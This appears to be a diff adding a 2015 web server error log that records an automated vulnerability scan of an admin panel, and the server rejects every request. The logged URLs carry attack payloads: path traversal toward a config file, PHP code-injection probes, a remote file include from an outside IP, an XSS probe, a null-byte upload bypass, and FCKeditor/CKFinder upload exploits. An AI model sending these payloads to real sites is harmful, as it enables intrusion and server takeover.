@@ -1,0 +1,66 @@
+[ 2015-07-13T16:47:00+08:00 ] 121.42.0.19 /admin/others.asp?mudi=download_EN_CN&n=index.asp&ENname=../config.asp
+ERR: 无法加载控制器:Others
+
+[ 2015-07-13T16:49:20+08:00 ] 121.42.0.19 /admin/include/common.inc.php?met_admin_type_ok=1&langset=459&met_langadmin[459][]=12345&str=echo%20md5%28%22233333%22%29%3b%2f%2f
+ERR: 无法加载控制器:Include
+
+[ 2015-07-13T16:49:24+08:00 ] 121.42.0.19 /admin/ckfinder/core/connector/asp/connector.asp?command=FileUpload&type=Images&Folder=%2F&langCode=zh-cn&hash=6c6a79911ae80ce2&
+ERR: 无法加载控制器:Ckfinder
+
+[ 2015-07-13T16:49:48+08:00 ] 121.42.0.19 /admin/modules/backup/page.backup.php
+ERR: 无法加载控制器:Modules
+
+[ 2015-07-13T16:49:49+08:00 ] 121.42.0.19 /admin/modules/backup/webscan233333.php
+ERR: 无法加载控制器:Modules
+
+[ 2015-07-13T16:51:20+08:00 ] 121.42.0.19 /index.php?g=Admin&m=http://120.26.55.211/s.txt&a=index&menuid=184&p=2
+ERR: 无法加载控制器:Http://120.26.55.211/s.txt
+
+[ 2015-07-13T16:51:30+08:00 ] 121.42.0.19 /index.php?g=Admin&m=http%3A%2F%2F120.26.55.211%2Fs.txt&a=index&menuid=184&p=2
+ERR: 无法加载控制器:Http://120.26.55.211/s.txt
+
+[ 2015-07-13T16:51:38+08:00 ] 121.42.0.19 /index.php?g=Admin&m=a_long_name_file_not_exist&a=index&menuid=184&p=2
+ERR: 无法加载控制器:A_long_name_file_not_exist
+
+[ 2015-07-13T16:56:31+08:00 ] 121.42.0.19 /admin/control/wxpay.php
+ERR: 无法加载控制器:Control
+
+[ 2015-07-13T16:58:12+08:00 ] 121.42.0.19 /index.php?g=Admin&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&a=index&menuid=184&p=2
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}
+
+[ 2015-07-13T16:58:36+08:00 ] 121.42.0.19 /index.php?g=Admin&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&a=index&menuid=184&p=2
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-07-13T16:58:58+08:00 ] 121.42.0.19 /index.php?g=Admin&m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&a=index&menuid=184&p=2
+ERR: 无法加载控制器:Print(md5(this_is_a_test_string));die();/*
+
+[ 2015-07-13T16:59:46+08:00 ] 121.42.0.19 /index.php?g=Admin&m=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&a=index&menuid=184&p=2
+ERR: 无法加载控制器:'">alert(98733)
+
+[ 2015-07-13T17:01:03+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=d04d.php%00.gif
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:01:38+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:02:17+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:02:53+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:03:27+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx?Command=FileUpload&Type=File&CurrentFolder=%2F
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:04:00+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F81dc9bdb52d04dc2.asp&NewFolderName=z&uuid=1244789975684
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:05:07+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=File&CurrentFolder=%2F81dc9bdb52d04dc2.asp&NewFolderName=z&uuid=1244789975684
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:06:09+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+ERR: 无法加载控制器:Fckeditor
+
+[ 2015-07-13T17:06:42+08:00 ] 121.42.0.19 /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=%2F
+ERR: 无法加载控制器:Fckeditor
+
